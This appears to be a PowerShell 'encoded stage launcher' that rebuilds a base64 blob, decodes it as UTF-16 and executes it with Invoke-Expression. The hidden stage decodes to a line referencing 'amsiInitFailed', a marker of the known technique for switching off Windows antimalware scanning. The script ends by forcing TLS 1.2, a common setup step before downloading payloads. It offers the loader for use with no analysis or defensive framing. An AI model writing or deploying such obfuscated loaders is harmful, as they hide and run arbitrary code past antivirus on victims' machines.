
<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.
#>
[CmdletBinding()]
param(
    [int]$TimeoutSec = 146
)
$Base64Text = (
    "JABBAG0AcwBpAE0AYQByAGsAZQByACAAPQAgACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBk" +
    "ACIA"
)
$StageText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Base64Text))
try {
    Write-Verbose ("Decoded stage length: " + $StageText.Length)
    if ([string]::IsNullOrWhiteSpace($StageText)) {
        throw "Decoded stage was empty"
    }
    Invoke-Expression $StageText
}
catch {
    Write-Warning "Encoded stage failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
